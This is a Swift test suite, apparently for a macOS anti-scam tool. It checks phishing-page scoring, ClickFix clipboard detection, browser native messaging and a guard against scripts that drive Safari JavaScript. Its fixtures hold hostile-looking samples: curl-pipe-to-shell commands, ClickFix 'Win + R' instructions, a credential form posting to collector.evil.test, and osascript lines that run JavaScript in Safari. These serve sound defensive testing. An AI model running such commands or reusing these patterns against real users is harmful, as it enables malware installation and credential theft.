        let bd = checker.checkPage(url: "https://docs.example.com/install", html: benignDocsPage, signals: nil)
        check(bd.verdict == .likelySafe, "benign docs page with copy button safe (\(bd.score) \(bd.signals.map(\.id)))")
        let bn = checker.checkPage(url: "https://news.example.com/science", html: benignNewsPage, signals: nil)
        check(bn.verdict == .likelySafe, "benign news page safe (\(bn.score))")
        let realApple = checker.checkPage(url: "https://appleid.apple.com/sign-in", html: credPhishPage.replacingOccurrences(of: "https://collector.evil.test/grab.php", with: "/auth"), signals: nil)
        check(realApple.verdict == .likelySafe, "real apple login not flagged (\(realApple.score))")

        // Structured signals from the extension (no HTML)
        var ps = PageSignals()
        ps.title = "Verify you are human"; ps.overlayText = "Verify you are human. Press Win + R, press Ctrl + V, press Enter"; ps.usesClipboardWrite = true
        let ext = checker.checkPage(url: "https://human-check.test/", html: nil, signals: ps)
        check(ext.signals.contains { $0.id == "page.clickfix.steps" } && ext.signals.contains { $0.category == .pageClipboard }, "extension signals clickfix")
        check(ext.verdict == .likelyScam, "extension signals verdict (\(ext.score))")
        var benignSig = PageSignals(); benignSig.title = "Example"; benignSig.visibleText = "Welcome to our site. Read the latest posts."; benignSig.usesClipboardWrite = true
        check(checker.checkPage(url: "https://blog.example.com/", html: nil, signals: benignSig).verdict == .likelySafe, "clipboard alone is not a verdict")
        check(PageAnalyzer.visibleText("<p>Hi&nbsp;there<br>you</p><script>x()</script>") == "Hi there\n you" || PageAnalyzer.visibleText("<p>Hi&nbsp;there<br>you</p><script>x()</script>").contains("Hi there"), "visible text extraction")
    }

    // MARK: Clipboard interception

    static func webClipboard() {
        check(WebVerdictService.looksLikeShellCommand("curl -fsSL https://x.test/a.sh | bash"), "shell command detected")
        check(WebVerdictService.looksLikeShellCommand("osascript -e 'do shell script \"x\"'"), "osascript detected")
        check(!WebVerdictService.looksLikeShellCommand("Hello, see you at 5"), "prose is not a command")
        check(!WebVerdictService.looksLikeShellCommand("https://www.example.com/page"), "url is not a command")
        check(WebVerdictService.isDeveloperHost("gist.github.com"), "developer host")
        check(!WebVerdictService.isDeveloperHost("verify-human.test"), "non developer host")
        let r1 = WebVerdictService.clipboardReport("curl -fsSL https://x.test/a.sh | bash", pageURL: "https://verify-human.test/")
        check(r1.verdict == .likelyScam, "command on non-dev site is scam (\(r1.score))")
        let r2 = WebVerdictService.clipboardReport("brew install git", pageURL: "https://github.com/x/y")
        check(r2.verdict == .likelySafe, "command on dev site is safe (\(r2.score))")
        let r3 = WebVerdictService.clipboardReport("just some text", pageURL: "https://verify-human.test/")
        check(r3.verdict == .likelySafe && r3.signals.isEmpty, "plain text copy is fine")
    }

    // MARK: Native messaging framing round-trip through the real host binary

    static func webNativeMessaging() {
        // In-process framing
        let req = NMRequest(id: "1", type: .checkURL, url: "https://paypa1.example/login")
        let data = try! NativeMessaging.encode(req)
        let len = data.prefix(4).withUnsafeBytes { $0.load(as: UInt32.self) }
        check(Int(len) == data.count - 4, "frame length prefix is native-endian byte count")
        let frames = NativeMessaging.unframe(data + data)
        check(frames.count == 2, "unframe splits concatenated frames")
        let svc = WebVerdictService(bridge: nil, seenStore: MemorySeenDomainStore(), allowlist: FileWebAllowlist(url: nil))
        let resp = svc.handle(req)
        check(resp.ok && resp.verdict != .likelySafe && resp.brand == "PayPal" && resp.id == "1", "service answers checkURL")
        check(svc.handle(NMRequest(type: .ping)).version == Product.version, "service ping")
        check(svc.handle(NMRequest(type: .checkText, text: "Send me the 6-digit code you just received")).verdict == .likelyScam, "service checkText")
        check(svc.handle(NMRequest(type: .checkClipboard, url: "https://verify.test/", text: "curl https://a.test/x | sh")).verdict == .likelyScam, "service checkClipboard")
        _ = svc.handle(NMRequest(type: .allowHost, host: "paypa1.example"))
        check(svc.handle(NMRequest(id: "2", type: .checkURL, url: "https://paypa1.example/login")).verdict == .likelySafe, "allowHost takes effect")
        check(svc.handle(NMRequest(type: .checkURL)).ok == false, "missing url is an error")
        var tamperSig = PageSignals(); tamperSig.forms = [PageSignals.Form(action: "/login", hasPassword: true)]
        let t = svc.handle(NMRequest(type: .checkPage, url: "https://www.example.com/login", signals: tamperSig, tamper: ["fetch was overridden after load", "new inline <script> added by an unknown source"]))
        check(t.reasons?.contains { $0.title.contains("changed after loading") } == true, "tamper observations reported")

        // Real binary over stdin/stdout.
        guard let nmh = findNMH() else { print("SKIP web: nmh stdio round-trip (rampart-nmh unavailable)"); return }
        let p = Process(); p.executableURL = URL(fileURLWithPath: nmh)
        let inPipe = Pipe(), outPipe = Pipe()
        p.standardInput = inPipe; p.standardOutput = outPipe; p.standardError = FileHandle.nullDevice
        do { try p.run() } catch { check(false, "launch rampart-nmh: \(error)"); return }
        var payload = Data()
        payload += try! NativeMessaging.encode(NMRequest(id: "a", type: .ping))
        payload += try! NativeMessaging.encode(NMRequest(id: "b", type: .checkURL, url: "https://xn--pypal-4ve.test/"))
        payload += try! NativeMessaging.encode(NMRequest(id: "c", type: .checkText, text: "Your package is on hold, pay the $1.99 fee at https://usps-fee.test"))
        payload += NativeMessaging.frame(Data("{not json".utf8))
        inPipe.fileHandleForWriting.write(payload)
        try? inPipe.fileHandleForWriting.close()
        let out = outPipe.fileHandleForReading.readDataToEndOfFile()
        p.waitUntilExit()
        let responses = NativeMessaging.unframe(out).compactMap { try? JSONDecoder().decode(NMResponse.self, from: $0) }
        check(responses.count == 4, "nmh answered every frame (\(responses.count))")
        check(responses.first?.id == "a" && responses.first?.ok == true, "nmh ping")
        check(responses.dropFirst().first?.verdict == .likelyScam && responses.dropFirst().first?.brand == "PayPal", "nmh homograph verdict")
        check(responses.dropFirst(2).first?.verdict != .likelySafe, "nmh text verdict")
        check(responses.last?.ok == false, "nmh rejects bad json")
        check(p.terminationStatus == 0, "nmh exits cleanly on EOF")
    }

    static func findNMH() -> String? { siblingProduct("rampart-nmh", envOverride: "RAMPART_NMH") }

    // MARK: Safari "JavaScript from Apple Events" guard: parsers over fixtures only (never touches TCC or the log)

    static func webSafariGuard() {
        // Unified log lines (ndjson from `log stream`) for TCC AppleEvents requests.
        let lines = [
            #"{"eventMessage":"AUTHREQ_CTX: msgID=1234.5, function=TCCAccessRequest, service=kTCCServiceAppleEvents, preflight=no, query=1, client=com.example.badapp, client_type=0, client_pid=4242, ... indirect_object_identifier=com.apple.Safari, indirect_object_identifier_type=0","subsystem":"com.apple.TCC","timestamp":"2026-11-06 10:00:00.000000+0000"}"#,
            #"{"eventMessage":"AUTHREQ_RESULT: msgID=1234.5, authValue=2, authReason=3, authVersion=1, error=(null), client=com.example.badapp, indirect_object_identifier=com.apple.Safari","subsystem":"com.apple.TCC"}"#,
            #"{"eventMessage":"AUTHREQ_CTX: msgID=99.1, function=TCCAccessRequest, service=kTCCServiceAppleEvents, client=app.rampart.app, client_pid=10, indirect_object_identifier=com.apple.Safari","subsystem":"com.apple.TCC"}"#,
            #"{"eventMessage":"AUTHREQ_CTX: msgID=77.1, function=TCCAccessRequest, service=kTCCServiceAppleEvents, client=com.example.music, indirect_object_identifier=com.apple.Music","subsystem":"com.apple.TCC"}"#,
            #"{"eventMessage":"unrelated message","subsystem":"com.apple.TCC"}"#,
        ]
        let events = lines.compactMap(SafariScriptGuard.parseLogLine)
        check(events.count == 4, "log parser yields 4 AppleEvents entries (\(events.count))")
        check(events[0].client == "com.example.badapp" && events[0].target == "com.apple.Safari" && events[0].kind == .request, "log request parsed")
        check(events[1].kind == .granted, "log result authValue=2 is granted")
        check(events[3].target == "com.apple.Music", "non-safari target parsed")
        let g = SafariScriptGuard(selfBundleIDs: ["app.rampart.app"])
        let findings = events.compactMap { g.evaluate(event: $0) }
        check(findings.count == 2, "guard flags the foreign Safari requester twice, not RamPart, not Music (\(findings.count))")
        check(findings.first?.bundleID == "com.example.badapp" && findings.first?.revokeCommand == "tccutil reset AppleEvents com.example.badapp", "finding carries revoke command")

        // TCC.db rows (fixture of the `access` table)
        let rows: [SafariScriptGuard.TCCRow] = [
            .init(service: "kTCCServiceAppleEvents", client: "app.rampart.app", authValue: 2, indirectObject: "com.apple.Safari"),
            .init(service: "kTCCServiceAppleEvents", client: "com.example.automator", authValue: 2, indirectObject: "com.apple.Safari"),
            .init(service: "kTCCServiceAppleEvents", client: "com.example.denied", authValue: 0, indirectObject: "com.apple.Safari"),
            .init(service: "kTCCServiceAppleEvents", client: "com.example.other", authValue: 2, indirectObject: "com.apple.Finder"),
            .init(service: "kTCCServiceAccessibility", client: "com.example.ax", authValue: 2, indirectObject: nil),
        ]
        let foreign = g.foreignSafariAutomators(rows)
        check(foreign == ["com.example.automator"], "tcc rows: only granted foreign Safari automators (\(foreign))")

        // Process watch: argv matching
        check(SafariScriptGuard.commandTargetsSafariJS(path: "/usr/bin/osascript", args: ["osascript", "-e", "tell application \"Safari\" to do JavaScript \"alert(1)\" in document 1"]), "osascript do JavaScript argv")
        check(SafariScriptGuard.commandTargetsSafariJS(path: "/usr/bin/osascript", args: ["osascript", "/tmp/x.scpt"]) == false, "osascript file ref alone is not conclusive")
        check(SafariScriptGuard.commandTargetsSafariJS(path: "/usr/bin/osascript", args: ["osascript", "-l", "JavaScript", "-e", "Application('Safari').doJavaScript('x', {in: t})"]), "JXA doJavaScript argv")
        check(!SafariScriptGuard.commandTargetsSafariJS(path: "/usr/bin/osascript", args: ["osascript", "-e", "display notification \"hi\""]), "harmless osascript")
        check(SafariScriptGuard.scriptSourceTargetsSafariJS("tell application \"Safari\"\n  do JavaScript \"document.forms[0].submit()\" in current tab of window 1\nend tell"), "AppleScript source targets Safari JS")
        check(!SafariScriptGuard.scriptSourceTargetsSafariJS("tell application \"Finder\" to empty trash"), "unrelated AppleScript")
        let proc = ProcessInfoLite(pid: 1, ppid: 0, path: "/usr/bin/osascript", args: ["osascript", "-e", "tell application \"Safari\" to do JavaScript \"x\" in document 1"], uid: 501, signingID: nil, teamID: nil, isPlatformBinary: true)
        let f = g.evaluate(exec: proc, parentSigningID: nil)
        check(f != nil && f!.severity == .high, "unsigned parent scripting Safari is high severity")
        let own = g.evaluate(exec: proc, parentSigningID: "app.rampart.app")
        check(own == nil, "RamPart's own osascript is ignored")
        let d = g.detection(for: findings[0])
        check(d.category == .suspicious && d.evidence.first?.source == .behaviour, "finding converts to Detection")
    }

    // MARK: Safari setup automation: AX element matching over recorded fixture trees

    static func webAXMatcher() {
        // A trimmed fixture of Safari's menu bar and Settings window as the AX API reports it.
        let safari = AXNode(role: "AXApplication", title: "Safari", children: [
            AXNode(role: "AXMenuBar", children: [
                AXNode(role: "AXMenuBarItem", title: "Safari", children: [AXNode(role: "AXMenu", children: [
                    AXNode(role: "AXMenuItem", title: "Settings…"), AXNode(role: "AXMenuItem", title: "Quit Safari")])]),
                AXNode(role: "AXMenuBarItem", title: "Develop", children: [AXNode(role: "AXMenu", children: [
                    AXNode(role: "AXMenuItem", title: "Open Page With"),
                    AXNode(role: "AXMenuItem", title: "Allow Unsigned Extensions", value: "0"),
                    AXNode(role: "AXMenuItem", title: "Allow JavaScript from Apple Events", value: "1"),
                    AXNode(role: "AXMenuItem", title: "Developer Settings…")])]),
            ]),
            AXNode(role: "AXWindow", title: "Advanced", children: [
                AXNode(role: "AXToolbar", children: [
                    AXNode(role: "AXButton", title: "General"), AXNode(role: "AXButton", title: "Extensions"), AXNode(role: "AXButton", title: "Advanced")]),
                AXNode(role: "AXGroup", children: [
                    AXNode(role: "AXCheckBox", title: "Show features for web developers", value: "0"),
                    AXNode(role: "AXCheckBox", title: "Show full website address", value: "1")])]),
            AXNode(role: "AXWindow", title: "Extensions", children: [
                AXNode(role: "AXGroup", children: [AXNode(role: "AXTable", children: [
                    AXNode(role: "AXRow", children: [AXNode(role: "AXCell", children: [AXNode(role: "AXCheckBox", title: "Some Other Extension", value: "1")])]),
                    AXNode(role: "AXRow", children: [AXNode(role: "AXCell", children: [AXNode(role: "AXCheckBox", title: "RamPart Web Protection", value: "0")])]),
                ])])]),
            AXNode(role: "AXSheet", children: [
                AXNode(role: "AXStaticText", value: "Safari is trying to allow unsigned extensions. Enter your password to allow this."),
                AXNode(role: "AXSecureTextField", title: "Password"), AXNode(role: "AXButton", title: "OK"), AXNode(role: "AXButton", title: "Cancel")]),
        ])
        let m = AXTreeMatcher()
        check(m.menuItem(in: safari, menu: "Develop", title: "Allow Unsigned Extensions")?.value == "0", "find Develop › Allow Unsigned Extensions")
        check(m.menuItem(in: safari, menu: "Develop", title: "Allow JavaScript from Apple Events")?.value == "1", "find Develop › Allow JavaScript from Apple Events")
        check(m.menuItem(in: safari, menu: "Develop", title: "Nonexistent") == nil, "missing menu item is nil")
        check(m.menuBarItem(in: safari, title: "Develop") != nil && m.menuBarItem(in: safari, title: "Window") == nil, "menu bar presence (Develop shown / Window absent)")
        check(m.checkbox(in: safari, titleContains: "features for web developers")?.value == "0", "find Advanced checkbox")
        check(m.toolbarButton(in: safari, title: "Extensions")?.role == "AXButton", "find settings toolbar button")
        check(m.extensionCheckbox(in: safari, nameContains: "RamPart")?.title == "RamPart Web Protection", "find RamPart extension row")
        check(m.passwordSheet(in: safari) != nil, "detect admin password sheet")
        check(m.passwordSheet(in: AXNode(role: "AXApplication", children: [])) == nil, "no sheet when absent")
        // Localised titles: matching is case- and diacritic-insensitive and tolerates the ellipsis.
        check(m.menuItem(in: safari, menu: "develop", title: "allow unsigned extensions") != nil, "case-insensitive menu match")
        check(m.menuItem(in: safari, menu: "Safari", title: "Settings...") != nil, "ellipsis tolerant match")
        // Plan: what the automation would do from this state.
        let plan = SafariSetupPlanner.plan(tree: safari, extensionName: "RamPart", wantJSFromAppleEvents: false)
        check(plan.steps.map(\.kind) == [.pressCheckbox, .pressMenuItem, .waitForPasswordSheet, .pressExtensionCheckbox, .pressMenuItem], "planner orders steps from fixture state (\(plan.steps.map(\.kind)))")
        check(plan.steps.last?.target == "Allow JavaScript from Apple Events", "planner turns off JS from Apple Events when not wanted")
        let done = AXNode(role: "AXApplication", title: "Safari", children: [
            AXNode(role: "AXMenuBar", children: [AXNode(role: "AXMenuBarItem", title: "Develop", children: [AXNode(role: "AXMenu", children: [
                AXNode(role: "AXMenuItem", title: "Allow Unsigned Extensions", value: "1"), AXNode(role: "AXMenuItem", title: "Allow JavaScript from Apple Events", value: "0")])])]),
            AXNode(role: "AXWindow", title: "Advanced", children: [AXNode(role: "AXCheckBox", title: "Show features for web developers", value: "1")]),
            AXNode(role: "AXWindow", title: "Extensions", children: [AXNode(role: "AXCheckBox", title: "RamPart Web Protection", value: "1")])])
        check(SafariSetupPlanner.plan(tree: done, extensionName: "RamPart", wantJSFromAppleEvents: false).steps.isEmpty, "planner is idempotent when already set up")
        let noDevelop = AXNode(role: "AXApplication", title: "Safari", children: [AXNode(role: "AXMenuBar", children: [AXNode(role: "AXMenuBarItem", title: "Safari")])])
        check(SafariSetupPlanner.plan(tree: noDevelop, extensionName: "RamPart", wantJSFromAppleEvents: false).steps.first?.kind == .pressCheckbox, "planner enables developer features first when Develop menu is hidden")
    }
}
